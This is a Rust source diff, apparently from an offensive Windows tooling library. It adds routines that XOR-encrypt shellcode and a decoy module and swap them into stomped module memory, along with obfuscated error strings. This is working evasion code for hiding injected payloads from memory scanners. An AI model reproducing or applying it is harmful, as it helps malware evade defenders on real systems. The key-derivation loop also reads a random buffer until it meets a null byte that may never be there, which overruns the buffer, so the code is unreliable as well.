@@ -5,16 +5,16 @@ use_litcrypt!();
 use std::{collections::HashMap, cell::UnsafeCell};
 use windows::Win32::Foundation::HANDLE;
 use data::{PeMetadata, PVOID, PAGE_READWRITE};
-use rand::{Rng, distributions::Alphanumeric, thread_rng};
+use nanorand::{Rng, BufferedRng, WyRand};
 
 pub struct Manager
 {
-    payloads: HashMap<i64, Vec<u8>>,
-    payloads_metadata: HashMap<i64, PeMetadata>,
-    decoys_metadata: HashMap<i64, PeMetadata>,
-    decoys: HashMap<i64, Vec<u8>>,
-    counter: HashMap<i64, i64>,
-    keys: HashMap<i64, u8>
+    payloads: HashMap<isize, Vec<u8>>,
+    payloads_metadata: HashMap<isize, PeMetadata>,
+    decoys_metadata: HashMap<isize, PeMetadata>,
+    decoys: HashMap<isize, Vec<u8>>,
+    counter: HashMap<isize, i64>,
+    keys: HashMap<isize, u8>
 }
 
 impl Manager {
@@ -29,7 +29,7 @@ impl Manager {
         }
     }
 
-    pub fn new_module (&mut self, address: i64, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
+    pub fn new_module (&mut self, address: isize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
     {   
         if self.payloads.contains_key(&address)
         {
@@ -41,12 +41,10 @@ impl Manager {
             let payload_metadata = manualmap::get_pe_metadata(payload.as_ptr())?;
             let decoy_metadata = manualmap::get_pe_metadata(decoy.as_ptr())?;
 
-            let rand_string: String = thread_rng()
-            .sample_iter(&Alphanumeric)
-            .take(15)
-            .map(char::from)
-            .collect();
-            let mut key_ptr = rand_string.as_ptr();
+            let mut rand_bytes = [0u8; 15];
+            let mut rng = BufferedRng::new(WyRand::new());
+            rng.fill(&mut rand_bytes);
+            let mut key_ptr = rand_bytes.as_ptr();
 
             let mut xor_key: u8 = *key_ptr;
             key_ptr = key_ptr.add(1);
@@ -66,7 +64,44 @@ impl Manager {
             self.counter.insert(address, 1);
             self.keys.insert(address, xor_key);
 
-            Manager::hide(self, address)?;
+            Manager::hide_module(self, address)?;
+
+        }
+
+        Ok(())
+    }
+
+    pub fn new_shellcode (&mut self, address: isize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
+    {   
+        if self.payloads.contains_key(&address)
+        {
+            return Err(lc!("[x] This shellcode is already mapped."));
+        }
+
+        unsafe 
+        {
+            let mut rand_bytes = [0u8; 15];
+            let mut rng = BufferedRng::new(WyRand::new());
+            rng.fill(&mut rand_bytes);
+            let mut key_ptr = rand_bytes.as_ptr();
+
+            let mut xor_key: u8 = *key_ptr;
+            key_ptr = key_ptr.add(1);
+            while *key_ptr != '\0' as u8
+            {
+                xor_key = xor_key ^ *key_ptr;
+                key_ptr = key_ptr.add(1);
+            }
+
+            let xored_payload = Manager::xor_module(payload, xor_key);
+            let xored_decoy = Manager::xor_module(decoy, xor_key);
+
+            self.payloads.insert(address, xored_payload);
+            self.decoys.insert(address, xored_decoy);
+            self.counter.insert(address, 1);
+            self.keys.insert(address, xor_key);
+
+            Manager::hide_shellcode(self, address)?;
 
         }
 
@@ -90,7 +125,7 @@ impl Manager {
         }
     }
 
-    pub fn map_module (&mut self, address: i64) -> Result<(),String>
+    pub fn map_module (&mut self, address: isize) -> Result<(),String>
     {
         unsafe
         {
@@ -142,7 +177,7 @@ impl Manager {
         }
     }
 
-    pub fn hide (&mut self, address: i64) -> Result<(),String>
+    pub fn hide_module(&mut self, address: isize) -> Result<(),String>
     {
         unsafe
         {
@@ -193,6 +228,60 @@ impl Manager {
 
             Ok(())
         }
+    }
+
+    pub fn hide_shellcode(&mut self, address: isize) -> Result<(),String>
+    {
+        if self.payloads.contains_key(&address)
+        {
+            if self.counter.get(&address).unwrap() == &1
+            {   
+                let decoy = self.decoys.get(&address).unwrap();
+                let key = *self.keys.get(&address).unwrap();
+                let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);    
+                let result = overload::managed_module_stomping(&decrypted_decoy, address, 0);
+
+                if !result.is_ok()
+                {
+                    return Err(lc!("[x] Error hiding shellcode."));
+                }
+            } 
+
+            if self.counter.get(&address).unwrap() >= &1
+            {
+                self.counter.insert(address, self.counter[&address] - 1);
+            }
+
+        }
+
+        Ok(())
+        
+    }
+
+    pub fn stomp_shellcode (&mut self, address: isize) -> Result<(),String>
+    {
+        if self.payloads.contains_key(&address)
+        {
+            if self.counter.get(&address).unwrap() == &0
+            {   
+                let payload = self.payloads.get(&address).unwrap();
+                let key = *self.keys.get(&address).unwrap();
+                let decrypted_payload = Manager::xor_module(payload.to_vec(), key);
+                let result = overload::managed_module_stomping(&decrypted_payload, address, 0);
+
+                if !result.is_ok()
+                {
+                    return Err(lc!("[x] Error stomping shellcode."));
+                }
+
+            } 
+
+            self.counter.insert(address, self.counter[&address] + 1);
+
+        }
+
+        Ok(())
+        
     }
 
 }
